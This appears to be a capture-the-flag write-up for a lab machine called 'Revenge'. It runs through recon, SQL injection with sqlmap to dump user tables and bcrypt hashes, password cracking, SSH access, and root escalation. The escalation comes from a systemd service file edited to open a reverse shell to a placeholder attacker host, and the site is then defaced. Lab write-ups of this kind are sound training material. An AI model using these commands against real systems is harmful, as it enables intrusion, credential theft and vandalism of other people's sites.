# Revenge

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

## Recon

`sudo nmap -Pn A -T4 revenge.thm`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:58:f3:21:42:b5:7e:5c:d8:f1:91:de:77:7e:4e:ba (RSA)
|   256 16:fa:98:92:13:c2:1f:f9:98:8a:81:19:1a:67:92:a8 (ECDSA)
|_  256 db:68:c3:d1:da:af:8b:87:17:40:98:88:f6:0b:6d:00 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

`gobuster dir -u http://revenge.thm -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt`

```
index                (Status: 200) [Size: 8541]
contact              (Status: 200) [Size: 6906]
products             (Status: 200) [Size: 7254]
login                (Status: 200) [Size: 4980]
admin                (Status: 200) [Size: 4983]
static               (Status: 301) [Size: 178] [--> http://revenge.thm/static/]
```

## SQL Injection / SQLi

`sqlmap -u http://revenge.thm/products/1 --batch --dbs`
    -u => specify target URL
    --batch => never ask for user input, use the default behavior
    --dbs => enumerate DBMS databases

```
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

`sqlmap -u http://revenge.thm/products/1 --batch -D duckyinc --tables`   

```
Database: duckyinc
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```

`sqlmap -u http://revenge.thm/products/1" --batch -D duckyinc -T user --dump`

Got the first flag. 

`sqlmap -u http://revenge.thm/products/1" --batch -D duckyinc -T system_user --dump`

Enumerated users and extracted password hashes, saved to users to a text file and password hashes to a hash file. 
The password hashes are encrypted using bcrypt.

`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.hash` 

Cracked one password with JohnTheRipper.

## Initial Access w/ SSH

`ssh <user>@revenge.thm`

Obtained second flag. 

## Privilege Escalation / PrivEsc

Superuser permissions can be read with `sudo -l`

The user has sudo perms to run systemctl, start some services and edit a service file as superuser.

According to GTFOBins, the service file can be tampered with, by pointing the `ExecStart` variable to the bash binary, effectively allowing RCE. In this case, we want a reverse shell connection. 

The service file can be edited to contain the following: 

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1'
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

```
This file is then saved to `/var/tmp/duckyincXXr6Hqgj.service`

After, refresh the service configuration with `sudo /bin/systemctl daemon-reload` and restart the service with `sudo /bin/systemctl duckyinc.service`
Finally, we have root! 

We cannot read the root directory, as the objectives of the mission are to deface or destroy the website.

- Website files are located at `/var/www/`, which contains two directories: `duckyinc` and `html`
- Inside  the `duckyinc` directory, navigate to the `templates directory`: `cd /var/www/duckyinc/templates`
- To deface the website, simply overwrite the `index.html` file: `echo "Defaced by 0xCryptic" > index.html`

Root flag has been obtained.
